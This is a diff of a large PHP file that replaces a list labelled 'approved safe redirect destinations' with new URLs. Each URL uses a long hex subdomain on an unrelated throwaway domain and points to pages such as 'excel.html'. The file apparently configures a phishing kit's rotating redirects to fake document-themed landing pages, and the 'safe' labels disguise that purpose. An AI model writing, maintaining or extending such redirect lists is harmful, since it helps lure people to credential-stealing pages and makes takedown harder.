@@ -7886,8 +7886,8 @@ $safeRedirectionUrl = '';
 
 // List of approved safe redirect destinations
 // Randomly selected when useSafeListRedirection is enabled
-$safeListRedirectionUrl = ['https://1edcaa0fe17acf540ae86c1ebe13d22b7ce6781f0352cfe53d56dc1bb5314f.fiberglassschina.cc/exbf371761202-css.html',
-'https://1edcaa0fe17acf540ae86c1ebe13d22b7ce6781f0352cfe53d56dc1bb5314f.testoriamirates.com/exbf371761202-css.html',
-'https://1edcaa0fe17acf540ae86c1ebe13d22b7ce6781f0352cfe53d56dc1bb5314f.testoriemirate.com/exbf371761202-css.html',
-'https://1edcaa0fe17acf540ae86c1ebe13d22b7ce6781f0352cfe53d56dc1bb5314f.xangohealers.com/exbf371761202-css.html']  // Add more safe URLs as needed
+$safeListRedirectionUrl = ['https://8e916652d5cd160311997b3840b42293fdc75000ba7eb97592b46cce6e1093.emotrans.space/excel.html',
+'https://8e916652d5cd160311997b3840b42293fdc75000ba7eb97592b46cce6e1093.kccworld.online/excel.html',
+'https://8e916652d5cd160311997b3840b42293fdc75000ba7eb97592b46cce6e1093.only-relocation.com/excel.html',
+'https://8e916652d5cd160311997b3840b42293fdc75000ba7eb97592b46cce6e1093.topgreatak.com/excel.html', 'https://8e916652d5cd160311997b3840b42293fdc75000ba7eb97592b46cce6e1093.only-relocation.com/excel.html']  // Add more safe URLs as needed
 ;
